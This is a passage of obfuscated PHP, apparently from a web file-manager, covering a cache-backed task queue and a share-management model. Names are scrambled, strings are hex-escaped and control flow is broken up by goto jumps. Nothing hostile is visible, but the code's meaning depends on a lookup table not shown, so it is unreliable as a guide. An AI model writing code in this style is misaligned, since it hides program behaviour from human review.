$E•©òòŠ’[$DÊ˜¸¼¬Õ¡[303]]); self::valueSet($this->task[$DÊ˜¸¼¬Õ¡[388]], $this->task); } public function progressEnd($fÅÍÜË¢Ö) { $cŒªâøİÛå =& $_SERVER[¹…ÕÄ]; self::log($cŒªâøİÛå[1572] . $this->task[$cŒªâøİÛå[388]]); $this->end(); } public function progress($fìÛñÈâİ¢, $aƒ›—ÔÃùŒ, $c—¢ÔŸË‰Å, $b³ªŠ¯­à, $AŠŸ’Ç“³Å) { $C§®¨ºÜò =& $_SERVER[¹…ÕÄ]; $e¯¬³‹å·÷ =& $this->task; if ($AŠŸ’Ç“³Å > 0) { $e¯¬³‹å·÷[$C§®¨ºÜò[1000]] = $e¯¬³‹å·÷[$C§®¨ºÜò[1000]] == 0 ? $b³ªŠ¯­à : $e¯¬³‹å·÷[$C§®¨ºÜò[1000]]; $e¯¬³‹å·÷[$C§®¨ºÜò[1014]] = $AŠŸ’Ç“³Å; } else { if ($c—¢ÔŸË‰Å > 0) { $e¯¬³‹å·÷[$C§®¨ºÜò[1000]] = $e¯¬³‹å·÷[$C§®¨ºÜò[1000]] == 0 ? $aƒ›—ÔÃùŒ : $e¯¬³‹å·÷[$C§®¨ºÜò[1000]]; $e¯¬³‹å·÷[$C§®¨ºÜò[1014]] = $c—¢ÔŸË‰Å; } } $this->update(); self::log("\x70\x72\x6f\147\x72\145\x73\163\x48\x74\164\160\72\x64\x6f\x77\x6e\x3a{$c—¢ÔŸË‰Å}\57{$aƒ›—ÔÃùŒ}\73\40\165\x70\x6c\157\141\x64\72{$AŠŸ’Ç“³Å}\57{$b³ªŠ¯­à}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\153\x51\x75\145\165\x65\x4c\145\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\x61\163\153\121\x75\145\x75\145\104\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($bØ¦ÙÛ“Œª, $DˆëŒ·…„Å = array(), $F©öèÑ¤©Ì = '', $fæù­İ®ïâ = '') { $C´·®š‚Çƒ =& $_SERVER[¹…ÕÄ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($fæù­İ®ïâ && array_find_by_field(self::$listData, $C´·®š‚Çƒ[92], $fæù­İ®ïâ)) { return !0; } self::$listData[] = array($C´·®š‚Çƒ[260] => $bØ¦ÙÛ“Œª, $C´·®š‚Çƒ[1573] => $DˆëŒ·…„Å, $C´·®š‚Çƒ[425] => $F©öèÑ¤©Ì, $C´·®š‚Çƒ[92] => $fæù­İ®ïâ); return !0; } public static function addSubmit() { $Dö‹¹‘çê‹ =& $_SERVER[¹…ÕÄ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($Dö‹¹‘çê‹[1574] . json_encode_force(array_to_keyvalue(self::$listData, $Dö‹¹‘çê‹[33], $Dö‹¹‘çê‹[425])), $Dö‹¹‘çê‹[1575]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($d¸É¿Ëãã, $c‚âñËˆŒŞ = array(), $a“ëò”â¹ë = '', $CÊÇ›ˆ°Øª = '') { goto b…Ê×Å¥™§; dÇëå¦òï: if ($CÊÇ›ˆ°Øª && array_find_by_field($aÙñ—÷ˆì, $b¨ö­È¹†­[92], $CÊÇ›ˆ°Øª)) { return !0; } $aÙñ—÷ˆì[] = array($b¨ö­È¹†­[260] => $d¸É¿Ëãã, $b¨ö­È¹†­[1573] => $c‚âñËˆŒŞ, $b¨ö­È¹†­[425] => $a“ëò”â¹ë, $b¨ö­È¹†­[92] => $CÊÇ›ˆ°Øª); write_log($b¨ö­È¹†­[1574] . $a“ëò”â¹ë, $b¨ö­È¹†­[1575]); goto Aƒ„¯‚Ê¸µ; b…Ê×Å¥™§: $b¨ö­È¹†­ =& $_SERVER[¹…ÕÄ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $aÙñ—÷ˆì = self::getAll(); goto dÇëå¦òï; Aƒ„¯‚Ê¸µ: self::setAll($aÙñ—÷ˆì); return !0; goto d‰¼ôØµÜÇ; d‰¼ôØµÜÇ: } public static function run() { goto A‰ÈÕºµŠ„; b«®­‡µ: try { Hook::apply($Aˆ›˜ÛÛÓÅ[$Aù¼áá©Ùº[260]], $Aˆ›˜ÛÛÓÅ[$Aù¼áá©Ùº[1573]]); } catch (Exception $dù¢÷²¥ˆ) { } $eÔ¡ãã‘‰ø = number_format(timeFloat() - $bŒ¡¦´ËÈ¬, 3) . $Aù¼áá©Ùº[1517]; write_log($Aù¼áá©Ùº[1576] . $Aˆ›˜ÛÛÓÅ[$Aù¼áá©Ùº[425]] . $Aù¼áá©Ùº[1577] . $eÔ¡ãã‘‰ø, $Aù¼áá©Ùº[1575]); goto dÚ Çßö¼; A‰ÈÕºµŠ„: $Aù¼áá©Ùº =& $_SERVER[¹…ÕÄ]; $d–¼Â‡»óª = self::getAll(); $Aˆ›˜ÛÛÓÅ = array_shift($d–¼Â‡»óª); goto FŠ¬äÍ×ˆ›; dÚ Çßö¼: return !0; goto e…äÀ­†Àà; FŠ¬äÍ×ˆ›: if (!$Aˆ›˜ÛÛÓÅ) { return !1; } self::setAll($d–¼Â‡»óª); $bŒ¡¦´ËÈ¬ = timeFloat(); goto b«®­‡µ; e…äÀ­†Àà: } public static function count() { $BÙÀáƒÚìî = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$BÙÀáƒÚìî) { return 0; } return intval($BÙÀáƒÚìî); } public static function getAll() { $AÄ‰Æ”½ùÒ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$AÄ‰Æ”½ùÒ) { return array(); } return $AÄ‰Æ”½ùÒ; } public static function setAll($e±‰›­Ìâè) { $F•Îøˆ÷“Õ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($e±‰›­Ìâè), $F•Îøˆ÷“Õ); Cache::set(self::QUEUE_DATA, $e±‰›­Ìâè, $F•Îøˆ÷“Õ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto dø˜²„Üªñ; F±„£Œš× : class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\157\x64\151\146\171\x54\151\155\x65", "\x74\x69\155\x65", "\x69\156\163\x65\x72\164\x2c\x75\x70\x64\141\x74\145", "\146\165\156\x63\164\151\157\156"), array("\x63\162\145\x61\164\145\124\151\x6d\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\162\x74", "\x66\165\156\143\164\151\x6f\x6e"), array("\x6f\160\164\151\x6f\156\x73", '', "\151\156\x73\x65\162\164\54\x75\160\144\141\164\145\x2c\163\x65\x6c\145\143\164", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($b±¯­®«øÔ) { $Eãºø‡îˆù =& $_SERVER[¹…ÕÄ]; $Cäö°™ø¤ = isset($b±¯­®«øÔ[0]) ? $b±¯­®«øÔ[0] : !1; return array($Eãºø‡îˆù[1796] => array(USER_ID, $Eãºø‡îˆù[1797]), $Eãºø‡îˆù[1740] => array($Cäö°™ø¤, $Eãºø‡îˆù[1798])); } protected function listSimple() { $b×ÏÔÅÉ‚ = array($_SERVER[¹…ÕÄ][1504] => USER_ID); $aª×åäİÒ´ = $this->field($this->fieldList)->where($b×ÏÔÅÉ‚)->select(); return $aª×åäİÒ´ ? $aª×åäİÒ´ : array(); } protected function getInfo($dí÷À¸Ã×, $D¤÷Å¤ô = false) { $aø¡…ÃòŞ¥ =& $_SERVER[¹…ÕÄ]; if ($D¤÷Å¤ô) { return $this->_getShareInfo(array($aø¡…ÃòŞ¥[462] => $dí÷À¸Ã×)); } $e•™šõÍãô = $this->cacheFunctionGet($aø¡…ÃòŞ¥[1747], $dí÷À¸Ã×); return $e•™šõÍãô; } public function getInfoByHash($F¡åœãìÎ) { return $this->_getShareInfo(array($_SERVER[¹…ÕÄ][464] => $F¡åœãìÎ)); } public function getInfoByPath($F¢ÎÛ‡‰¨) { $b´Ìù†’÷Ô =& $_SERVER[¹…ÕÄ]; $DÕ›á©×× = array($b´Ìù†’÷Ô[1504] => USER_ID, $b´Ìù†’÷Ô[390] => $F¢ÎÛ‡‰¨); return $this->_getShareInfo($DÕ›á©××); } public function getInfoBySourcePath($c»§‚¯îíÁ) { $e¨Ô±öï¡Å =& $_SERVER[¹…ÕÄ]; $b”ªïØâ = array($e¨Ô±öï¡Å[1504] => USER_ID, $e¨Ô±öï¡Å[1049] => $c»§‚¯îíÁ); return $this->_getShareInfo($b”ªïØâ); } private function _getShareInfo($AöÊÒùñ½‡) { goto cªàçé‡ù; cªàçé‡ù: $F‰†ĞÙ®Ë =& $_SERVER[¹…ÕÄ]; $cĞÀˆÓÓŸĞ = $this->where($AöÊÒùñ½‡)->find(); if (!$cĞÀˆÓÓŸĞ) { return !1; } goto b´öèÓõÍŠ; b´öèÓõÍŠ: $AöÊÒùñ½‡ = array($F‰†ĞÙ®Ë[462] => $cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[462]]); $e°„Æˆ–àî = $F‰†ĞÙ®Ë[1799]; $e¨Ç®¨—â¢ = Model($F‰†ĞÙ®Ë[559])->order($F‰†ĞÙ®Ë[388])->field($e°„Æˆ–àî)->where($AöÊÒùñ½‡)->select(); goto CŞ’ê–É¾å; CŞ’ê–É¾å: if ($cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[390]] == $F‰†ĞÙ®Ë[491]) { $cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[84]] = IO::info($cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[1049]]); } else { $cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[84]] = Model($F‰†ĞÙ®Ë[1183])->pathInfo($cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[390]]); } $cĞÀˆÓÓŸĞ[$F‰†ĞÙ®Ë[1800]] = $e¨Ç®¨—â¢; return $cĞÀˆÓÓŸĞ; goto FÊÑ›ì“Çˆ; FÊÑ›ì“Çˆ: } protected function getInfoAuth($cÆ›¸±†‰ò) { $eßáš›äáŸ =& $_SERVER[¹…ÕÄ]; $aËĞ‡‘Ó¹ï = $this->getInfo($cÆ›¸±†‰ò); $aËĞ‡‘Ó¹ï[$eßáš›äáŸ[400]] = Model($eßáš›äáŸ[476])->authMake($aËĞ‡‘Ó¹ï[$eßáš›äáŸ[1800]]); return $aËĞ‡‘Ó¹ï; } protected function listData($EŒÍ†Ô¿ÁÂ = null, $cËôØâìÅ¹ = 300) { $f‚Ù×ğÉµ‡ =& $_SERVER[¹…ÕÄ]; $cÑ¿’¹Ÿ¸® = array(array($f‚Ù×ğÉµ‡[467] => array($f‚Ù×ğÉµ‡[948], 0), $f‚Ù×ğÉµ‡[469] => array($f‚Ù×ğÉµ‡[948], 0), $f‚Ù×ğÉµ‡[1801] => $f‚Ù×ğÉµ‡[1755])); if ($EŒÍ†Ô¿ÁÂ == $f‚Ù×ğÉµ‡[1802]) { $cÑ¿’¹Ÿ¸® = array($f‚Ù×ğÉµ‡[467] => 1); } else { if ($EŒÍ†Ô¿ÁÂ == $f‚Ù×ğÉµ‡[1034]) { $cÑ¿’¹Ÿ¸® = array($f‚Ù×ğÉµ‡[469] => 1); } } $cÑ¿’¹Ÿ¸®[$f‚Ù×ğÉµ‡[1504]] = USER_ID; $b™ˆØ£µ¡© = $this->where($cÑ¿’¹Ÿ¸®)->selectPage($cËôØâìÅ¹); return $b™ˆØ£µ¡©; } protected function listToMe($AèèÇßîØ = 300) { goto BÛô¤çÊˆ; e•’¨®œÌ: $eàäÒÛÌÌ® = array($FìÓ®Ü’ËÔ[1805] => $D¤¶¾¾—œ, $FìÓ®Ü’ËÔ[1806] => $d‡ùÛ—Ÿ[$FìÓ®Ü’ËÔ[362]]); return $eàäÒÛÌÌ®; goto E¯‚¹ÀŠ†Ä; BÛô¤çÊˆ: $FìÓ®Ü’ËÔ =& $_SERVER[¹…ÕÄ]; $b½Ê…–Òß = Model($FìÓ®Ü’ËÔ[1803])->userGroupParents(USER_ID); $f´ğ•Åô˜ã = array($FìÓ®Ü’ËÔ[544] => SourceModel::TYPE_USER, $FìÓ®Ü’ËÔ[478] => USER_ID); goto d÷„®”¯—í; cÑ‚åÁÏ‡: $D¤¶¾¾—œ = $this->field($F‡“Ï³íøò)->where($f´ğ•Åô˜ã)->select(); foreach ($D¤¶¾¾—œ as $fÖ¢Û‡öéÊ => &$eŸ²Â‡†²«) { $eŸ²Â‡†²«[$FìÓ®Ü’ËÔ[1800]] = $d¯å‹òîÁî[$eŸ²Â‡†²«[$FìÓ®Ü’ËÔ[462]]]; } unset($eŸ²Â‡†²«); goto e•’¨®œÌ; d÷„®”¯—í: if ($b½Ê…–Òß) { $f´ğ•Åô˜ã = array(array($FìÓ®Ü’ËÔ[544] => SourceModel::TYPE_USER, $FìÓ®Ü’ËÔ[478] => USER_ID), array($FìÓ®Ü’ËÔ[544] => SourceModel::TYPE_GROUP, $FìÓ®Ü’ËÔ[478] => array($FìÓ®Ü’ËÔ[7], $b½Ê…–Òß)), $FìÓ®Ü’ËÔ[1801] => $FìÓ®Ü’ËÔ[1755]); } $d‡ùÛ—Ÿ = Model($FìÓ®Ü’ËÔ[559])->where($f´ğ•Åô˜ã)->selectPage($AèèÇßîØ); $d¯å‹òîÁî = array_to_keyvalue_group($d‡ùÛ—Ÿ[$FìÓ®Ü’ËÔ[365]], $FìÓ®Ü’ËÔ[462]); goto fÄƒäĞìì§; fÄƒäĞìì§: if (!$d¯å‹òîÁî) { return $d‡ùÛ—Ÿ; } $F‡“Ï³íøò = $FìÓ®Ü’ËÔ[1804]; $f´ğ•Åô˜ã = array($FìÓ®Ü’ËÔ[462] => array($FìÓ®Ü’ËÔ[405], array_keys($d¯å‹òîÁî))); goto cÑ‚åÁÏ‡; E¯‚¹ÀŠ†Ä: } protected function shareAdd($F‡ÓÜ˜¯‘, $F¡ÄÏĞœ‰) { $E „îÔóã =& $_SERVER[¹…ÕÄ]; $B½­Ÿ’¼Ù¹ = $this->_addShareData($F‡ÓÜ˜¯‘, $F¡ÄÏĞœ‰); if (!empty($F¡ÄÏĞœ‰[$E „îÔóã[1807]])) { $this->_shareAuthSet($B½­Ÿ’¼Ù¹, $F¡ÄÏĞœ‰[$E „îÔóã[1807]]); } $this->shareEventAdd($F‡ÓÜ˜¯‘, $F¡ÄÏĞœ‰, $E „îÔóã[1037]); return $B½­Ÿ’¼Ù¹; } private function shareEventAdd($C÷ïæÖ«ñ´, $b õ•„º±Û, $C§é„öÁÃ¿ = "\x61\x64\144") { goto B‡µ«õÃ¥æ; eæ¸ÍˆÏÉÊ: return; goto f ø‹‹ôæ÷; C“ÀØŸŠ¶Ê: $B¼Ö°Ü¥å = $D÷À°…óË[1810]; if ($D„èéÃºëŠ[$D÷À°…óË[467]] == $D÷À°…óË[491] && $b õ•„º±Û[$D÷À°…óË[467]] == $D÷À°…óË[86]) { $B¼Ö°Ü¥å = $D÷À°…óË[1808]; } if ($D„èéÃºëŠ[$D÷À°…óË[467]] == $D÷À°…óË[86] && $b õ•„º±Û[$D÷À°…óË[467]] == $D÷À°…óË[491]) { $B¼Ö°Ü¥å = $D÷À°…óË[1811]; } goto f›†¿äÑ¯; B‡µ«õÃ¥æ: $D÷À°…óË =& $_SERVER[¹…ÕÄ]; if ($C§é„öÁÃ¿ == $D÷À°…óË[1037]) { if ($b õ•„º±Û[$D÷À°…óË[467]] == $D÷À°…óË[86]) { Model($D÷À°…óË[528])->eventShare($C÷ïæÖ«ñ´, $D÷À°…óË[1808]); } if ($b õ•„º±Û[$D÷À°…óË[469]] == $D÷À°…óË[86]) { Model($D÷À°…óË[528])->eventShare($C÷ïæÖ«ñ´, $D÷À°…óË[1809]); } return; } $D„èéÃºëŠ = $this->getInfoByPath($C÷ïæÖ«ñ´); goto C“ÀØŸŠ¶Ê; f›†¿äÑ¯: if ($D„èéÃºëŠ[$D÷À°…óË[469]] == $D÷À°…óË[491] && $b õ•„º±Û[$D÷À°…óË[469]] == $D÷À°…óË[86]) { $B¼Ö°Ü¥å = $D÷À°…óË[1809]; } if ($D„èéÃºëŠ[$D÷À°…óË[469]] == $D÷À°…óË[86] && $b õ•„º±Û[$D÷À°…óË[469]] == $D÷À°…óË[491]) { $B¼Ö°Ü¥å = $D÷À°…óË[1812]; } Model($D÷À°…óË[528])->eventShare($C÷ïæÖ«ñ´, $B¼Ö°Ü¥å); goto eæ¸ÍˆÏÉÊ; f ø‹‹ôæ÷: } private function _addShareData($F©îÄ½áÑŠ, $CùÒš‚é•ï = array()) { goto cä¼‘†Œ›; A§ÚôôÆŠ²: $CÇ„íÜ¿£† = array($c”˜àÉÎšØ[1496] => USER_ID, $c”˜àÉÎšØ[404] => $F©îÄ½áÑŠ, $c”˜àÉÎšØ[1409] => $c”˜àÉÎšØ[33], $c”˜àÉÎšØ[467] => 0, $c”˜àÉÎšØ[469] => 0, $c”˜àÉÎšØ[1049] => $c”˜àÉÎšØ[33], $c”˜àÉÎšØ[303] => $c”˜àÉÎšØ[33], $c”˜àÉÎšØ[828] => $c”˜àÉÎšØ[33], $c”˜àÉÎšØ[1814] => 0, $c”˜àÉÎšØ[1815] => 0, $c”˜àÉÎšØ[470] => 0, $c”˜àÉÎšØ[471] => $c”˜àÉÎšØ[33], $c”˜àÉÎšØ[464] => $c”˜àÉÎšØ[33]); $Eâ®Çä¥Î† = explode($c”˜àÉÎšØ[47], $c”˜àÉÎšØ[1816]); foreach ($Eâ®Çä¥Î† as $Aùœƒ™ëÈ³) { if (!isset($CùÒš‚é•ï[$Aùœƒ™ëÈ³])) { continue; } $CÇ„íÜ¿£†[$Aùœƒ™ëÈ³] = $CùÒš‚é•ï[$Aùœƒ™ëÈ³]; } goto bÆä•šğ–; E±‘¦ö¾ô‘: return $DôÇîŠÊ¥æ; goto d¡¸Ìƒ¨¢ª; Fùˆ®õ‡£®: if ($E£¼£Î„É³ = $this->where($Eâ›çŒÔä¡)->find()) { return $E£¼£Î„É³[$c”˜àÉÎšØ[462]]; } if ($F©îÄ½áÑŠ == 0) { $cÉŞ¦îÅù¼ = array($c”˜àÉÎšØ[28] => get_path_this($CùÒš‚é•ï[$c”˜àÉÎšØ[75]])); } else { $cÉŞ¦îÅù¼ = Model($c”˜àÉÎšØ[770])->sourceInfo($F©îÄ½áÑŠ); if (!$cÉŞ¦îÅù¼) { return !1; } } if (!$CùÒš‚é•ï[$c”˜àÉÎšØ[1409]]) { $CùÒš‚é•ï[$c”˜àÉÎšØ[1409]] = $cÉŞ¦îÅù¼[$c”˜àÉÎšØ[28]]; } goto A§ÚôôÆŠ²; bÆä•šğ–: $DôÇîŠÊ¥æ = $this->add($CÇ„íÜ¿£†); $a´áíŸòš» = array($c”˜àÉÎšØ[464] => short_id($DôÇîŠÊ¥æ)); $this->where(array($c”˜àÉÎšØ[461] => $DôÇîŠÊ¥æ))->save($a´áíŸòš»); goto E±‘¦ö¾ô‘; cä¼‘†Œ›: $c”˜àÉÎšØ =& $_SERVER[¹…ÕÄ]; $Eâ›çŒÔä¡ = array($c”˜àÉÎšØ[404] => $F©îÄ½áÑŠ, $c”˜àÉÎšØ[1496] => USER_ID); if ($F©îÄ½áÑŠ == 0) { $Eâ›çŒÔä¡ = array($c”˜àÉÎšØ[1813] => $CùÒš‚é•ï[$c”˜àÉÎšØ[1049]], $c”˜àÉÎšØ[1496] => USER_ID); } goto Fùˆ®õ‡£®; d¡¸Ìƒ¨¢ª: } private function _shareAuthSet($f÷‡­ÊĞ, $b³¶Ş—Ò±œ) { goto CÁİêºŒ; c¶ÎÌíÇ”: return $b‡Í¾ï¬²¿->addAll($aôÊ¿ÏàÚÃ, array(), !0); goto AöëÊ£Ö½Ö; C„¶ƒ¼§½Î: $b‡Í¾ï¬²¿->where(array($b¼Ñóé¦ô[462] => $f÷‡­ÊĞ))->delete(); $aôÊ¿ÏàÚÃ = array(); foreach ($b³¶Ş—Ò±œ as $E“Óè·Ï„¢) { $dÅ°Ò„’ = SourceModel::TYPE_USER; if ($E“Óè·Ï„¢[$b¼Ñóé¦ô[398]] == SourceModel::TYPE_GROUP) { $dÅ°Ò„’ = SourceModel::TYPE_GROUP; } $dĞâ¶©ô¶¬ = array($b¼Ñóé¦ô[462] => $f÷‡­ÊĞ, $b¼Ñóé¦ô[398] => $dÅ°Ò„’, $b¼Ñóé¦ô[478] => intval($E“Óè·Ï„¢[$b¼Ñóé¦ô[478]]), $b¼Ñóé¦ô[1763] => 0, $b¼Ñóé¦ô[1817] => -1); if ($E“Óè·Ï„¢[$b¼Ñóé¦ô[1763]]) { $dĞâ¶©ô¶¬[$b¼Ñóé¦ô[1763]] = $E“Óè·Ï„¢[$b¼Ñóé¦ô[1763]]; } else { if ($E“Óè·Ï„¢[$b¼Ñóé¦ô[1817]]) { $dĞâ¶©ô¶¬[$b¼Ñóé¦ô[1817]] = $E“Óè·Ï„¢[$b¼Ñóé¦ô[1817]]; } } $aôÊ¿ÏàÚÃ[] = $dĞâ¶©ô¶¬; } goto c¶ÎÌíÇ”; CÁİêºŒ: $b¼Ñóé¦ô =& $_SERVER[¹…ÕÄ]; if (!is_array($b³¶Ş—Ò±œ)) { return !1; } $b‡Í¾ï¬²¿ = Model($b¼Ñóé¦ô[1767]); goto C„¶ƒ¼§½Î; AöëÊ£Ö½Ö: } public function numViewAdd($b³¬¨»„µ¶) { $f™öŸªùÆÕ =& $_SERVER[¹…ÕÄ]; $C‹¶¥Ÿ Ü¡ = array($f™öŸªùÆÕ[461] => $b³¬¨»„µ¶); $this->where($C‹¶¥Ÿ Ü¡)->setAdd($f™öŸªùÆÕ[1814]); } public function numDownloadAdd($f ášáº¾») { $dƒ†§å»¾Ú =& $_SERVER[¹…ÕÄ]; $EÜ§İ”…¦ = array($dƒ†§å»¾Ú[461] => $f ášáº¾»); $this->where($EÜ§İ”…¦)->setAdd($dƒ†§å»¾Ú[1815]); } protected function shareEdit($F¡ÇÂ™Û÷‰, $Aºøóè§œğ) { goto D’¿êŠä»©; AÒ™ÕÓ™ù: if (isset($Aºøóè§œğ[$cÏ‘ …ÓÍ[1807]])) { $this->_shareAuthSet($F¡ÇÂ™Û÷‰, $Aºøóè§œğ[$cÏ‘ …ÓÍ[1807]]); } return !0; goto cÇ‹ïíÌ™“; D’¿êŠä»©: $cÏ‘ …ÓÍ =& $_SERVER[¹…ÕÄ]; $A…±˜±¹Ü” = $this->getInfo($F¡ÇÂ™Û÷‰); if (!$A…±˜±¹Ü”) { return !1; } goto c†Á‡Ó³¾Û; c†Á‡Ó³¾Û: $this->_checkLinkShare($Aºøóè§œğ, $A…±˜±¹Ü”); $eãÇÀ¥Œò = array(); $bö¡¨äÎäÍ = explode($cÏ‘ …ÓÍ[47], $cÏ‘ …ÓÍ[1818]); goto b¯âŸ±À ; b¯âŸ±À : foreach ($bö¡¨äÎäÍ as $D¸äĞˆêÜ) { if (!array_key_exists($D¸äĞˆêÜ, $Aºøóè§œğ)) { continue; } $eãÇÀ¥Œò[$D¸äĞˆêÜ] = $Aºøóè§œğ[$D¸äĞˆêÜ]; } $this->shareEventAdd($A…±˜±¹Ü”[$cÏ‘ …ÓÍ[390]], $Aºøóè§œğ, $cÏ‘ …ÓÍ[1634]); $this->where(array($cÏ‘ …ÓÍ[461] => $F¡ÇÂ™Û÷‰))->save($eãÇÀ¥Œò); goto AÒ™ÕÓ™ù; cÇ‹ïíÌ™“: } private function _checkLinkShare($eÅ»±´É¶è, $bô¢ËøÔÚ) { goto C·£ÅâŞ‘ó; A ‹–ç•Á: $dĞğ±†å—Ñ = $this->shareFileMeta($Açñ†šÑ[$FÔä×ÓœÅß[441]]); if (isset($dĞğ±†å—Ñ[$FÔä×ÓœÅß[370]]) && $dĞğ±†å—Ñ[$FÔä×ÓœÅß[370]] == $FÔä×ÓœÅß[86]) { show_json(LNG($FÔä×ÓœÅß[1821]), !1); } goto bº»Ñ»œ‚­; C·£ÅâŞ‘ó: $FÔä×ÓœÅß =& $_SERVER[¹…ÕÄ]; if ($eÅ»±´É¶è[$FÔä×ÓœÅß[467]] != $FÔä×ÓœÅß[86]) { return; } $d§°’Ê°Ç = $bô¢ËøÔÚ[$FÔä×ÓœÅß[84]][$FÔä×ÓœÅß[390]]; goto BìÃ„Í‘¾ä; BìÃ„Í‘¾ä: if ($bô¢ËøÔÚ[$FÔä×ÓœÅß[84]][$FÔä×ÓœÅß[29]] != $FÔä×ÓœÅß[173]) { $céº‡¯¤ = $this->_folderReport($d§°’Ê°Ç); if (!$céº‡¯¤) { return; } show_json(LNG($FÔä×ÓœÅß[1819]) . $FÔä×ÓœÅß[1820] . $céº‡¯¤, !1); } $Açñ†šÑ = Model($FÔä×ÓœÅß[770])->fileInfoGet($bô¢ËøÔÚ[$FÔä×ÓœÅß[84]][$FÔä×ÓœÅß[390]]); if (!$Açñ†šÑ) { return; } goto A ‹–ç•Á; bº»Ñ»œ‚­: } private function _folderReport($B¶õ‘å†î¬) { goto Dˆ®™í‡ò†; cÓË­¶íÓÄ: if (!$A»¨–øğ¥“) { return !1; } $A»¨–øğ¥“ = array_to_keyvalue($A»¨–øğ¥“, $B©Å–¦øë×[33], $B©Å–¦øë×[441]); $D–¤ÈÎ‡ = $B©Å–¦øë×[47] . $B¶õ‘å†î¬ . $B©Å–¦øë×[47]; goto f¾¤ÑàŠõá; BçÂ¼ÂŒ·­: $DÉŸ¿ ÆÒ = substr($eÍê§†Âò…[$B©Å–¦øë×[481]], strpos($eÍê§†Âò…[$B©Å–¦øë×[481]], $D–¤ÈÎ‡)); $C§¾Ù‚–Ú = array($B©Å–¦øë×[390] => array($B©Å–¦øë×[7], trim($DÉŸ¿ ÆÒ, $B©Å–¦øë×[47]))); $cã×Àßí§ = Model($B©Å–¦øë×[770])->where($C§¾Ù‚–Ú)->field($B©Å–¦øë×[28])->select(); goto e¦•âã¦î·; Dˆ®™í‡ò†: $B©Å–¦øë× =& $_SERVER[¹…ÕÄ]; $C§¾Ù‚–Ú = array($B©Å–¦øë×[441] => array($B©Å–¦øë×[948], 0), $B©Å–¦øë×[705] => 3); $A»¨–øğ¥“ = Model($B©Å–¦øë×[1822])->where($C§¾Ù‚–Ú)->field($B©Å–¦øë×[441])->select(); goto cÓË­¶íÓÄ; e¦•âã¦î·: $Eñ¥İºŠ«  = array_to_keyvalue($cã×Àßí§, $B©Å–¦øë×[33], $B©Å–¦øë×[28]); $Eñ¥İºŠ« [] = $eÍê§†Âò…[$B©Å–¦øë×[28]]; return implode($B©Å–¦øë×[8], $Eñ¥İºŠ« ); goto Aªå‘˜³Ş…; f¾¤ÑàŠõá: $C§¾Ù‚–Ú = array($B©Å–¦øë×[441] => array($B©Å–¦øë×[7], $A»¨–øğ¥“), $B©Å–¦øë×[481] => array($B©Å–¦øë×[378], "\45{$D–¤ÈÎ‡}\45"), $B©Å–¦øë×[417] => 0); $eÍê§†Âò… = Model($B©Å–¦øë×[770])->where($C§¾Ù‚–Ú)->field($B©Å–¦øë×[1823])->find(); if (!$eÍê§†Âò…) { return !1; } goto BçÂ¼ÂŒ·­; Aªå‘˜³Ş…: } protected function remove($E©È £È¤Ô) { goto a…íâŠã×; a…íâŠã×: $FŒˆ†•ÕÅÅ =& $_SERVER[¹…ÕÄ]; if (is_array($E©È £È¤Ô)) { $E©È £È¤Ô = array($FŒˆ†•ÕÅÅ[7], $E©È £È¤Ô); } $FÇ»‰÷åó¢ = array($FŒˆ†•ÕÅÅ[462] => $E©È £È¤Ô); goto b°ğƒë‰Û; f ÂÒôìß·: for ($b¶¬œ½š‹° = 0; $b¶¬œ½š‹° < count($d­äß›•Âæ); $b¶¬œ½š‹°++) { $F¡‚”¹‹« = $this->getInfo($d­äß›•Âæ[$b¶¬œ½š‹°]); if ($F¡‚”¹‹«[$FŒˆ†•ÕÅÅ[469]] == $FŒˆ†•ÕÅÅ[86]) { Model($FŒˆ†•ÕÅÅ[528])->eventShare($F¡‚”¹‹«[$FŒˆ†•ÕÅÅ[390]], $FŒˆ†•ÕÅÅ[1812]); } if ($F¡‚”¹‹«[$FŒˆ†•ÕÅÅ[467]] == $FŒˆ†•ÕÅÅ[86]) { Model($FŒˆ†•ÕÅÅ[528])->eventShare($F¡‚”¹‹«[$FŒˆ†•ÕÅÅ[390]], $FŒˆ†•ÕÅÅ[1811]); } } return $e«·ºÓ‚¶í; goto D‡´ÖÌîÜÃ; b°ğƒë‰Û: $e«·ºÓ‚¶í = $this->where($FÇ»‰÷åó¢)->delete(); if ($e«·ºÓ‚¶í) { Model($FŒˆ†•ÕÅÅ[559])->where(array($FŒˆ†•ÕÅÅ[462] => $E©È £È¤Ô))->delete(); } $d­äß›•Âæ = is_array($E©È £È¤Ô) ? $E©È £È¤Ô[1] : array($E©È £È¤Ô); goto f ÂÒôìß·; D‡´ÖÌîÜÃ: } protected function removeBySource($B°‰æ ©¹×) { goto Fóö‘Ï±Ï; a¡–Ş¸Ë¾Ø: $this->where($EºŒŸ›Ë‰)->delete(); Model($fÏ³„Ëš…[559])->where($EºŒŸ›Ë‰)->delete(); goto F†ŠÙ‰î¾; fƒ‚áµ¥Ã„: $E—»âæ¹¨– = array_to_keyvalue($E—»âæ¹¨–, $fÏ³„Ëš…[33], $fÏ³„Ëš…[462]); if (!$E—»âæ¹¨–) { return; } $EºŒŸ›Ë‰ = array($fÏ³„Ëš…[461] => array($fÏ³„Ëš…[405], $E—»âæ¹¨–)); goto a¡–Ş¸Ë¾Ø; Fóö‘Ï±Ï: 